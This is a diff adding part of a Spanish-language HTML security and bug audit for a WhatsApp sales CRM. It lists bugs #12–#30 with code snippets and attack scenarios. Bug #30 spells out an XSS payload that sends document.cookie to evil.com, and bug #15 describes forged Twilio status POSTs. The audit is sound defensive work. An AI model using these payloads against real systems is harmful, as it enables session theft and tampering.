+      <p>Prospect envía "mi tarjeta es 4532-1234-5678-9012". <code>wa_messages.body</code> tiene "[REDACTED]" (correcto). Pero <code>wa_conversations.last_message_preview</code> tiene "mi tarjeta es 4532-1234-5678-90" en texto plano. Cualquiera con acceso a la DB puede ver números de tarjeta.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 12 -->
+<div id="bug12" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#12</span>
+    <span class="bug-title">Meeting detection "skip" es cosmético — detectMeetingConfirmation corre igual</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">steve-wa-chat.ts:1443-1464</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Líneas 1443-1462 detectan que una afirmación corta NO es sobre una reunión y hacen log del "skip". Pero <code>detectMeetingConfirmation</code> en línea 1464 corre incondicionalmente. El "skip" es aspiracional, no funcional. Un "sí" que responde a otra pregunta puede agendar una reunión falsa.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// Líneas 1443-1462: Detecta que "sí" no es sobre reunión</span>
+<span class="keyword">if</span> (shortAffirmation && !aboutMeeting) {
+  console.log(<span class="string">'[skip meeting detection]'</span>);  <span class="comment">// ← Solo loguea, no previene nada</span>
+}
+
+<span class="comment">// Línea 1464: CORRE SIEMPRE, ignora el "skip"</span>
+<span class="keyword">const</span> meetingResult = <span class="keyword">await</span> <span class="highlight">detectMeetingConfirmation</span>(messageBody, history);
+<span class="comment">// → Si messageBody = "sí" → puede retornar confirmed: true</span>
+<span class="comment">// → Se agenda reunión basándose en un "sí" que era respuesta a otra pregunta</span></div>
+    </div>
+    <div class="scenario">
+      <p>Steve pregunta "¿Cuántos empleados tienes?". Prospect responde "sí" (queriendo decir "sí, tengo empleados"). El check de skip detecta que no es sobre reunión. Pero <code>detectMeetingConfirmation("sí", history)</code> corre igual y puede retornar <code>confirmed: true</code>. Se agenda una reunión fantasma.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 13 -->
+<div id="bug13" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#13</span>
+    <span class="bug-title">Timezone Chile mal calculado → reuniones válidas rechazadas o pasadas aceptadas</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">steve-wa-chat.ts:1489-1491</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p><code>new Date(new Date().toLocaleString('en-US', { timeZone: 'America/Santiago' }))</code> crea un Date con hora Chile interpretada como UTC. El timestamp interno está MAL. La comparación <code>meetingDate > chileNow</code> puede rechazar reuniones futuras o aceptar pasadas.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// El anti-patrón clásico de timezone en JS</span>
+<span class="keyword">const</span> chileNow = <span class="keyword">new</span> Date(
+  <span class="keyword">new</span> Date().toLocaleString(<span class="string">'en-US'</span>, { timeZone: <span class="string">'America/Santiago'</span> })
+);
+<span class="comment">// Si UTC = 23:00, Chile = 19:00</span>
+<span class="comment">// toLocaleString retorna "4/9/2026, 7:00:00 PM"</span>
+<span class="comment">// new Date("4/9/2026, 7:00:00 PM") → interpreta como 19:00 UTC (WRONG!)</span>
+<span class="comment">// chileNow.getTime() = 19:00 UTC en vez de 23:00 UTC - 4h offset</span>
+
+<span class="keyword">if</span> (meetingDate.getTime() > <span class="highlight">chileNow.getTime()</span>) {
+  <span class="comment">// Comparación con timestamp incorrecto</span>
+}</div>
+    </div>
+    <div class="scenario">
+      <p>UTC=23:00, Chile=19:00. Reunión propuesta a 22:00 UTC (18:00 Chile). <code>chileNow</code> parsea como 19:00 UTC. <code>22:00 UTC > 19:00 UTC</code> → true → acepta. PERO si la reunión es a 18:30 UTC (14:30 Chile, 4.5h en el pasado real), <code>18:30 > 19:00</code> → false → rechaza correctamente. El bug es inconsistente según la hora del día.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 14 -->
+<div id="bug14" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#14</span>
+    <span class="bug-title">Filtro de segmento de campaña es un no-op → envía a TODOS los contactos</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">send-campaign.ts:81-86</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>El filtro de segmento para <code>'abandoned'</code> es un placeholder comentado. Cualquier otro segmento es silenciosamente ignorado. Si un merchant crea una campaña dirigida a segmento <code>'vip'</code>, TODOS los contactos la reciben.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// send-campaign.ts líneas 81-86</span>
+<span class="keyword">if</span> (campaign.segment === <span class="string">'abandoned'</span>) {
+  <span class="comment">// TODO: filtrar por carritos abandonados</span>
+}
+<span class="comment">// Para segment = 'vip', 'new', 'inactive', etc:</span>
+<span class="comment">// <span class="highlight">NO HAY FILTRO. Se envía a todos.</span></span></div>
+    </div>
+    <div class="scenario">
+      <p>Merchant crea campaña "Descuento VIP exclusivo 50%" con segment='vip' (50 contactos). El filtro no existe. La campaña llega a los 500 contactos totales. 450 personas no-VIP reciben un descuento exclusivo que no les corresponde. Créditos desperdiciados, margen perdido.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 15 -->
+<div id="bug15" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#15</span>
+    <span class="bug-title">Status callback sin validación Twilio → métricas de campaña manipulables</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">status-callback.ts:10-19</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>A diferencia de <code>steve-wa-chat.ts</code> que al menos intenta validar HMAC, el status callback acepta cualquier POST sin autenticación. Un atacante puede marcar mensajes como <code>delivered</code>, <code>read</code> o <code>failed</code>, manipulando métricas de campaña.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="keyword">export async function</span> statusCallback(c: Context) {
+  <span class="keyword">const</span> body = <span class="keyword">await</span> c.req.parseBody();
+  <span class="comment">// ← CERO validación HMAC</span>
+  <span class="comment">// ← CERO verificación de firma Twilio</span>
+  <span class="comment">// ← Cualquiera puede enviar MessageSid + MessageStatus</span>
+
+  <span class="keyword">const</span> messageSid = body.MessageSid;
+  <span class="keyword">const</span> status = body.MessageStatus;
+  <span class="comment">// ... actualiza wa_messages.status directamente ...</span>
+}</div>
+    </div>
+    <div class="scenario">
+      <p>Atacante envía POST a <code>/api/whatsapp/status-callback</code> con <code>MessageSid=SM_real&MessageStatus=read</code> para cada mensaje de una campaña. Las métricas muestran 100% read rate. El merchant piensa que la campaña fue exitosa cuando nadie la leyó.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 16 -->
+<div id="bug16" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#16</span>
+    <span class="bug-title">Status callback sobrescribe metadata → campaign_id destruido permanentemente</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">status-callback.ts:26-29</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Cuando hay <code>errorCode</code>, el UPDATE reemplaza TODO el campo <code>metadata</code> con <code>{ error_code: errorCode }</code>. El <code>campaign_id</code> que vivía en metadata se pierde. Luego el código intenta leer <code>metadata.campaign_id</code> (ya borrado) para actualizar métricas → métricas rotas permanentemente.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// status-callback.ts líneas 24-30</span>
+<span class="keyword">await</span> supabase.from(<span class="string">'wa_messages'</span>).update({
+  status: messageStatus,
+  metadata: errorCode ? <span class="highlight">{ error_code: errorCode }</span> : undefined,
+  <span class="comment">// ← REEMPLAZA metadata completo. campaign_id: "abc-123" → BORRADO</span>
+}).eq(<span class="string">'message_sid'</span>, messageSid);
+
+<span class="comment">// Línea 44: intenta leer campaign_id del metadata que acaba de borrar</span>
+<span class="keyword">const</span> campaignId = (msg?.metadata <span class="keyword">as</span> any)?.campaign_id;
+<span class="comment">// → undefined (fue sobrescrito arriba) → métricas nunca se actualizan</span></div>
+    </div>
+    <div class="scenario">
+      <p>Campaña envía 100 mensajes. 5 fallan con error 21610 (opt-out). Para esos 5, metadata pasa de <code>{campaign_id: "abc"}</code> a <code>{error_code: "21610"}</code>. El campaign_id se pierde. Las métricas de campaña nunca registran los 5 failures. El dashboard muestra 95 enviados, 0 fallidos (debería ser 95 ok, 5 failed).</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 17 -->
+<div id="bug17" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#17</span>
+    <span class="bug-title">Rate limiter en memoria → no funciona entre instancias de Cloud Run</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">steve-wa-chat.ts:220-221</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p><code>lastResponseTime</code> es un <code>Map&lt;string, number&gt;</code> en memoria del proceso. Cloud Run escala a múltiples instancias, cada una con su propio Map. Mensajes rápidos del mismo teléfono pueden hit distintas instancias y bypass el rate limit de 30 segundos.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="keyword">const</span> lastResponseTime = <span class="keyword">new</span> Map&lt;string, number&gt;();  <span class="comment">// ← EN MEMORIA</span>
+
+<span class="comment">// Instancia A: lastResponseTime = {"+569123": 1712678400000}</span>
+<span class="comment">// Instancia B: lastResponseTime = {} (vacío, no comparte)</span>
+
+<span class="comment">// Prospect envía 3 mensajes en 5 segundos:</span>
+<span class="comment">// Msg 1 → Instancia A → responde (rate limit set)</span>
+<span class="comment">// Msg 2 → Instancia B → <span class="highlight">responde TAMBIÉN</span> (no tiene el rate limit)</span>
+<span class="comment">// Msg 3 → Instancia A → bloqueado (rate limit activo)</span>
+<span class="comment">// Resultado: 2 respuestas AI en vez de 1</span></div>
+    </div>
+    <div class="scenario">
+      <p>Prospect ansioso envía 3 mensajes en 5 segundos. Request 1 → instancia A (responde). Request 2 → instancia B (responde también, no tiene rate limit). Prospect recibe 2 respuestas de Steve, cada una quemando tokens de Claude. El rate limit de 30s es ilusorio bajo carga.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 18 -->
+<div id="bug18" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#18</span>
+    <span class="bug-title">admin_notes sobrescribe en vez de agregar → notas anteriores perdidas</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">prospect-crm.ts:116</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p><code>prospectAddNote</code> hace <code>.update({ admin_notes: note })</code> que REEMPLAZA todo el campo. No hay read-modify-write ni append. Cada nueva nota destruye todas las anteriores. La función se llama "Add" pero hace "Replace".</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// prospect-crm.ts línea 116</span>
+<span class="keyword">await</span> supabase.from(<span class="string">'wa_prospects'</span>).update({
+  <span class="highlight">admin_notes: note</span>,  <span class="comment">// ← REEMPLAZA, no append</span>
+  updated_at: <span class="keyword">new</span> Date().toISOString()
+}).eq(<span class="string">'id'</span>, prospect_id);</div>
+    </div>
+    <div class="scenario">
+      <p>Admin escribe "Llamé al cliente, interesado en plan premium". Después escribe "Hacer follow up la próxima semana". La primera nota desaparece para siempre. Solo queda "Hacer follow up la próxima semana".</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 19 -->
+<div id="bug19" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#19</span>
+    <span class="bug-title">Password temporal guardado en texto plano en wa_messages</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">prospect-trial.ts:33,100</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>El password temporal se genera y envía por WA (ok, WhatsApp es E2E). Pero TAMBIÉN se guarda en <code>wa_messages.body</code> en texto plano en la DB. Cualquiera con acceso a Supabase o al visor de mensajes del admin puede ver el password de cada usuario.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="keyword">const</span> tempPassword = generateTempPassword();  <span class="comment">// "aX7$kM2p"</span>
+
+<span class="comment">// Línea 100-114: Envía WA con el password</span>
+<span class="keyword">const</span> welcomeMsg = <span class="string">`¡Bienvenido! Tu password temporal: <span class="highlight">${tempPassword}</span>`</span>;
+
+<span class="comment">// Se guarda en wa_messages:</span>
+<span class="keyword">await</span> supabase.from(<span class="string">'wa_messages'</span>).insert({
+  body: <span class="highlight">welcomeMsg</span>,  <span class="comment">// ← Password en texto plano en la DB</span>
+  direction: <span class="string">'out'</span>,
+  <span class="comment">// Cualquier admin puede ver: "Tu password temporal: aX7$kM2p"</span>
+});</div>
+    </div>
+    <div class="scenario">
+      <p>Admin abre el historial de mensajes de un prospect recién convertido. Ve: "¡Bienvenido! Tu password temporal: aX7$kM2p". Si el usuario no cambió el password, el admin puede hacer login como él.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 20 -->
+<div id="bug20" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#20</span>
+    <span class="bug-title">Trial: WA falla → 500 pero auth user ya creado → retry bloqueado con 409</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">prospect-trial.ts:102-124</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Si <code>sendWhatsApp</code> falla (Twilio caído, teléfono inválido), la excepción sube al catch externo que retorna 500. Pero pasos 1-5 ya ejecutaron: el user existe, tiene rol, tiene client, prospect actualizado. El caller piensa que falló, reintenta → 409 "User already exists". El user nunca recibe sus credenciales.</p>
+    </div>
+    <div class="scenario">
+      <p>Trial activation OK en pasos 1-5. Twilio temporalmente caído en paso 6. Endpoint retorna 500. Frontend muestra "Error". Admin reintenta → 409. El prospect ya fue convertido en la DB pero nunca recibió su password. No puede usar la plataforma. No se puede re-crear. Stuck.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 21 -->
+<div id="bug21" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#21</span>
+    <span class="bug-title">Phone normalization ausente en web forms → prospects duplicados</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">web-forms.ts:126-138</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Teléfonos de web forms no se normalizan antes del check de duplicados. "569 1234 5678", "+56912345678", "56912345678" y "912345678" son la misma persona pero fallan el <code>.eq('phone', phone)</code>. Se crean múltiples prospects para el mismo contacto.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// web-forms.ts línea 126-138</span>
+<span class="keyword">const</span> phone = data.telefono;  <span class="comment">// ← Sin normalizar</span>
+
+<span class="keyword">const</span> { data: existing } = <span class="keyword">await</span> supabase
+  .from(<span class="string">'wa_prospects'</span>)
+  .select(<span class="string">'id'</span>)
+  .eq(<span class="string">'phone'</span>, <span class="highlight">phone</span>)  <span class="comment">// ← Match exacto, no normalizado</span>
+  .single();
+<span class="comment">// "56912345678" !== "+56912345678" → crea duplicado</span></div>
+    </div>
+    <div class="scenario">
+      <p>Juan llena el form con "569 1234 5678". Luego llena otro form con "+56912345678". Son la misma persona pero se crean 2 prospects. Lead data queda dividida. Reporting muestra 2 leads cuando es 1. Pipeline inflado artificialmente.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 22 -->
+<div id="bug22" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#22</span>
+    <span class="bug-title">verifyProspectOwnership: acceso cross-tenant a prospects sin convertir</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">user-scoping.ts:56-57</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Cuando un prospect tiene <code>converted_client_id = null</code>, la función retorna <code>allowed: clientIds.length > 0</code>. Cualquier usuario autenticado con al menos 1 client puede ver, editar y mover CUALQUIER prospect sin asignar de CUALQUIER tenant.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// user-scoping.ts líneas 56-57</span>
+<span class="keyword">if</span> (!prospect.converted_client_id) {
+  <span class="keyword">return</span> { allowed: <span class="highlight">clientIds.length > 0</span> };
+  <span class="comment">// ← Si tienes AL MENOS 1 client → puedes acceder a CUALQUIER prospect sin asignar</span>
+  <span class="comment">// ← No importa si el prospect es de otro tenant</span>
+}</div>
+    </div>
+    <div class="scenario">
+      <p>Vendedor de Tenant A descubre el UUID de un prospect de Tenant B (visible en URL o logs). Como el prospect no tiene <code>converted_client_id</code>, y el vendedor tiene al menos 1 client, la verificación pasa. Puede ver detalles, mensajes, deal value, y mover el stage del prospect ajeno.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 23 -->
+<div id="bug23" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#23</span>
+    <span class="bug-title">Resurrection WA ignora opt-out → riesgo de ban de Twilio</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">prospect-followup.ts:239-305</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>La lógica de "resurrección" envía WA a prospects marcados como <code>lost + ghosted</code> después de 14 días. No verifica si el prospect respondió "STOP", "no más mensajes" o hizo opt-out. WhatsApp/Twilio tienen reglas estrictas: enviar a opt-outs puede banear la cuenta.</p>
+    </div>
+    <div class="scenario">
+      <p>Prospect respondió "STOP" hace 3 semanas (capturado por Twilio internamente). 14 días después, el cron de resurrection le envía "Hey, ¿sigues interesado?". Twilio flaggea la cuenta por enviar a un opt-out. Después de 3 violaciones, Twilio suspende el número de Steve.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 24 -->
+<div id="bug24" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#24</span>
+    <span class="bug-title">total_sent no atómico → contador incorrecto en abandoned cart</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">abandoned-cart-wa.ts:182-185</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p><code>automation.total_sent + 1</code> lee el valor del SELECT inicial. Si 5 carritos se procesan en el mismo batch, todos leen el MISMO valor y todos escriben <code>initial + 1</code> en vez de <code>initial + 5</code>. El contador se pierde 4 mensajes.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// Línea 59-70: SELECT automation → total_sent = 10</span>
+
+<span class="comment">// Loop: procesa 5 carritos</span>
+<span class="keyword">for</span> (<span class="keyword">const</span> cart <span class="keyword">of</span> carts) {
+  <span class="comment">// ... envía WA ...</span>
+
+  <span class="comment">// Línea 182-185: UPDATE con valor STALE</span>
+  <span class="keyword">await</span> supabase.from(<span class="string">'wa_automations'</span>).update({
+    total_sent: <span class="highlight">automation.total_sent + 1</span>  <span class="comment">// ← Siempre escribe 11, no 11,12,13,14,15</span>
+  });
+}
+<span class="comment">// Resultado: total_sent = 11 (debería ser 15)</span></div>
+    </div>
+    <div class="scenario">
+      <p>Merchant tiene 5 carritos abandonados. total_sent empieza en 10. Los 5 se procesan. Cada iteración escribe total_sent=11 (10+1). Al final, total_sent=11 en vez de 15. Reporting muestra 1 mensaje enviado cuando fueron 5. Métricas completamente incorrectas.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 25 -->
+<div id="bug25" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#25</span>
+    <span class="bug-title">Email nurture sin mecanismo real de unsubscribe → compliance issue</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">prospect-email-nurture.ts:63-64</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>El footer del email dice "Si no quieres más emails, responde 'no mas emails'". Pero NO hay código que procese esas respuestas. No hay webhook de Resend. No hay unsubscribe link real. El "unsubscribe" es un callejón sin salida. Viola CAN-SPAM y leyes de email marketing.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// prospect-email-nurture.ts línea 63-64</span>
+<span class="keyword">const</span> footer = <span class="string">`Si no quieres más emails, responde "no mas emails"`</span>;
+<span class="comment">// ← Esta instrucción no funciona: no hay webhook de Resend configurado</span>
+<span class="comment">// ← No hay endpoint que procese respuestas de email</span>
+<span class="comment">// ← El prospect responde, el email va a la nada, sigue recibiendo emails</span></div>
+    </div>
+    <div class="scenario">
+      <p>Prospect recibe email de nurture. Responde "no mas emails". La respuesta no va a ninguna parte (no hay webhook). 3 días después recibe otro email. Responde de nuevo. Otro email. Si reporta como spam, afecta el sender reputation del dominio entero.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 26 -->
+<div id="bug26" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#26</span>
+    <span class="bug-title">Sin rate limiting cross-cron → 3+ mensajes WA al mismo merchant en un día</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">Múltiples crons WA</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p><code>prospect-followup</code>, <code>onboarding-wa</code>, <code>churn-detector</code> y <code>merchant-upsell</code> pueden TODOS enviar WA al mismo teléfono el mismo día. No hay deduplicación cross-cron. Un merchant puede recibir 3-4 mensajes automatizados el mismo día.</p>
+    </div>
+    <div class="scenario">
+      <p>Merchant no logueó en 15 días. Churn detector envía "¿Todo bien?" a las 2pm. Onboarding WA envía "Aún necesitas conectar Klaviyo" a las 4pm. Merchant upsell envía "Deberías probar email marketing" el domingo. 3 mensajes automatizados en 3 días del mismo número. Parece spam.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 27 -->
+<div id="bug27" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#27</span>
+    <span class="bug-title">Booking: catch vacío swallow FreeBusy error → permite double-booking</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">booking-api.ts:301</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>En <code>bookingConfirm</code>, el double-check de FreeBusy está en un <code>try {} catch {}</code> con catch VACÍO. Si FreeBusy falla (network, JSON parse, timeout), el error se swallowea y la reserva procede como si el slot estuviera libre.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="keyword">try</span> {
+  <span class="comment">// FreeBusy check: ¿el slot sigue disponible?</span>
+  <span class="keyword">const</span> freeBusy = <span class="keyword">await</span> fetch(googleFreeBusyUrl, {...});
+  <span class="keyword">const</span> data = <span class="keyword">await</span> freeBusy.json();
+  <span class="comment">// ... verificar si hay conflicto ...</span>
+} <span class="keyword">catch</span> <span class="highlight">{}</span>  <span class="comment">// ← CATCH VACÍO. Error swallowed silenciosamente.</span>
+
+<span class="comment">// Continúa y crea el evento en Google Calendar aunque FreeBusy falló</span>
+<span class="keyword">await</span> createCalendarEvent(...);</div>
+    </div>
+    <div class="scenario">
+      <p>Dos prospects reservan el mismo slot casi simultáneamente. Prospect A reserva OK. Prospect B intenta reservar. FreeBusy debería rechazar, pero Google API tarda y timeout. El catch vacío se traga el error. Se crea un segundo evento en el mismo horario. Vendedor tiene 2 reuniones al mismo tiempo.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 28 -->
+<div id="bug28" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#28</span>
+    <span class="bug-title">OAuth state usado para nombre del vendedor, sin CSRF token</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">CalendarConnect.tsx:60</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>El parámetro <code>state</code> de OAuth2 existe para protección CSRF. Aquí se usa para pasar el nombre del vendedor (<code>state: sellerName || 'Vendedor'</code>). No hay token random, no hay verificación en el callback. Un atacante puede crear un link OAuth malicioso.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="keyword">const</span> authUrl = <span class="string">`https://accounts.google.com/o/oauth2/v2/auth?`</span> +
+  <span class="keyword">new</span> URLSearchParams({
+    client_id: GOOGLE_CLIENT_ID,
+    redirect_uri: REDIRECT_URI,
+    response_type: <span class="string">'code'</span>,
+    scope: SCOPES,
+    <span class="highlight">state: sellerName || 'Vendedor'</span>,  <span class="comment">// ← Debería ser un token CSRF random</span>
+    access_type: <span class="string">'offline'</span>,
+  });</div>
+    </div>
+    <div class="scenario">
+      <p>Atacante crea un link OAuth con su propia cuenta de Google y <code>state=Vendedor</code>. Víctima (admin de Steve) hace click. El callback de Steve procesa el auth code del atacante y conecta el calendario del atacante como el del vendedor. Las citas de prospects van al calendario equivocado.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 29 -->
+<div id="bug29" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#29</span>
+    <span class="bug-title">ProspectKanban.delete llama Supabase directo, bypasses backend auth</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">ProspectKanban.tsx:159</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Todas las operaciones del Kanban (mover, actualizar deal) pasan por <code>callApi()</code> con auth backend. EXCEPTO delete, que llama a Supabase directo con el anon key. Bypass completo de <code>verifyProspectOwnership</code>. Si RLS no está perfecto, cualquier user puede borrar cualquier prospect.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// ProspectKanban.tsx línea 159 — DELETE directo a Supabase</span>
+<span class="keyword">const</span> { error } = <span class="keyword">await</span> <span class="highlight">supabase</span>  <span class="comment">// ← anon key, no backend</span>
+  .from(<span class="string">'wa_prospects'</span>)
+  .delete()
+  .eq(<span class="string">'id'</span>, prospectId);
+<span class="comment">// ← No pasa por callApi()</span>
+<span class="comment">// ← No verifica verifyProspectOwnership()</span>
+<span class="comment">// ← Depende 100% de RLS policies</span>
+
+<span class="comment">// Mientras que mover stage SÍ usa el backend:</span>
+<span class="comment">// await callApi('crm/prospect/move-stage', { body: {...} });</span></div>
+    </div>
+    <div class="scenario">
+      <p>Un usuario no-admin en el Kanban hace click en el botón de eliminar. La llamada va directo a Supabase sin verificación de ownership. Si RLS permite delete (lo cual es posible si el policy usa auth.uid() y el prospect no tiene owner), el prospect se borra permanentemente. Sin audit trail.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 30 -->
+<div id="bug30" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#30</span>
+    <span class="bug-title">XSS via redirect_url en web forms → ejecución de JS en browser del prospect</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">WebForm.tsx:72</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Después de submit, el form usa <code>window.location.href = data.redirect_url</code> donde <code>redirect_url</code> viene de la DB. Si un atacante (vía Bug #7) cambia el <code>redirect_url</code> a <code>javascript:alert(document.cookie)</code>, se ejecuta JavaScript en el browser del prospect que llenó el form.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// WebForm.tsx línea 72</span>
+<span class="keyword">if</span> (data.redirect_url) {
+  setTimeout(() => {
+    <span class="highlight">window.location.href = data.redirect_url;</span>
+    <span class="comment">// ← Si redirect_url = "javascript:alert(document.cookie)"</span>
+    <span class="comment">// ← Se ejecuta JS en el browser del prospect</span>
+  }, 2000);
+}</div>
+    </div>
+    <div class="scenario">
+      <p>Atacante explota Bug #7 (webFormsCrud sin multi-tenant) para cambiar el <code>redirect_url</code> de un form a <code>javascript:fetch('https://evil.com/steal?c='+document.cookie)</code>. Prospect llena el form. 2 segundos después, su cookie/session es enviada al atacante. Cadena: Bug #7 → Bug #30 = full XSS.</p>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
